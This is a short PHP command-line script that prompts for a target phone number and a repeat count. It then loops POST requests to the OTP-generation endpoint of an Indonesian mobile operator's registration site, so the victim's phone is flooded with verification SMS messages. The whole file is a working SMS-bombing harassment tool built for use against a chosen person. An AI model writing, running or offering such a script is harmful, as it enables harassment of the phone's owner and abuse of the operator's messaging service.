#!/usr/bin/php

<?php

$url = "https://registrasi.tri.co.id/daftar/generateOTP";
$nomor = readline("[+] Target  : ");
$limit = readline("[+] Limit   : ");
$payload = array("msisdn" => $nomor);
echo "\n";

$options = array(
    'http' => array(
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($payload)
    )
);

for ($i=1; $i<=$limit; $i++){
	$context  = stream_context_create($options);
	$result = file_get_contents($url, false, $context);
	echo "[+] Status -> ".$result."\n";
}

?>
